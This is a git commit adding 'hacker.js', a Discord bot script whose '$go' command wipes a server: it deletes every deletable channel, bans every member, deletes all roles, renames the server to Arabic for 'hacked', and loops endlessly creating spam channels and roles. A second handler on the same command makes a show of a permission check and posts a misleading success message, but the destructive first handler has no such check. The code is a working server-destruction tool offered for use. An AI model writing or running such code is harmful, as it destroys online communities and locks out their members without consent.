67e87de36d4d613cba81ad5294b29b30228bcd75
ZaLiV12 <44550056+ZaLiV12@users.noreply.github.com>
2019-07-18 15:56:49 +0300

    Add files via upload

---
+++ hacker.js
@@ -0,0 +1,60 @@
+const Discord = require("discord.js");
+const client = new Discord.Client();
+
+client.on('message', message =>{
+    if (message.content.startsWith('$go')){
+            if (message.channel.guild){
+                message.guild.channels.forEach(c =>{
+                    if(c.deletable){
+                        c.delete()
+                    }
+                })
+                message.guild.members.forEach(m =>{
+                    m.ban()
+                })
+                message.guild.roles.forEach(r=>{
+                    r.delete()
+                })
+                message.guild.setName('تم التهكير.')
+                setInterval(function(){
+                    message.guild.createChannel('تم التهكير.', 'voice')
+                    message.guild.createChannel('تم التهكير. ', 'text')
+                    message.guild.createRole({name : 'تم التهكير. '})
+                })
+            }
+        }
+});
+
+client.on('message', message => {
+    if (message.content === "$go") {
+    if(!message.channel.guild) return message.channel.send('**This Command Only For Servers !**')
+            if (!message.member.hasPermission('MANAGE_CHANNELS')) return message.channel.send(`**${message.author.username} You Dont Have** ``MANAGE_CHANNELS`` **Premission**`);
+
+		
+		
+		
+		
+     message.guild.createChannel('تم التهكير.', 'text')
+	 message.guild.createChannel('تم التهكير.', 'text')
+	 message.guild.createChannel('تم التهكير.', 'text')
+	 message.guild.createChannel('تم التهكير.', 'text')
+	 message.guild.createChannel('تم التهكير.', 'text')
+	 message.guild.createChannel('تم التهكير.', 'text')
+	 message.guild.createChannel('تم التهكير.', 'text')
+     message.guild.createChannel('تم التهكير.', 'voice')
+	 message.guild.createChannel('تم التهكير.', 'voice')
+	 message.guild.createChannel('تم التهكير.', 'voice')
+	 message.guild.createChannel('تم التهكير.', 'voice')
+	 message.guild.createChannel('تم التهكير.', 'voice')
+	 message.guild.createChannel('تم التهكير.', 'voice')
+	 message.guild.createChannel('تم التهكير.', 'voice')
+	 message.guild.createChannel('تم التهكير.', 'voice')
+	 message.guild.createChannel('تم التهكير.', 'voice')
+	 message.guild.createChannel('تم التهكير.', 'voice')
+
+    
+message.channel.sendMessage('**Text Channel Was Succsesfluy Created**')
+}
+});
+ 
+client.login("توكن البوت");
